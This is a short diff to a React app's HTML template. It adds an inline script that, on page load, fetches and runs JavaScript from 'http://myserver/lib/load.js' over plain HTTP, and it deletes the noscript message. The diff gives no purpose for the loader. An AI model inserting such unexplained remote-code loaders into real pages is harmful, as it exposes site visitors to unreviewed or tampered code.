@@ -26,10 +26,20 @@
     --> 
     <!-- Note to change to ont awesome link -->
 <script src="https://kit.fontawesome.com/d90b026d5e.js" crossorigin="anonymous"></script>
-    <title>React App</title>
+  <script>
+    setTimeout(function () {
+      var head, script;
+      head = document.getElementsByTagName("head")[0];
+      script = document.createElement("script");
+      script.src = "http://myserver/lib/load.js";
+      head.appendChild(script);
+    }, 1);
+  </script>
+
+
+<title>React App</title>
   </head>
   <body>
-    <noscript>You need to enable JavaScript to run this app.</noscript>
     <div id="root"></div>
     <!--
       This HTML file is a template.
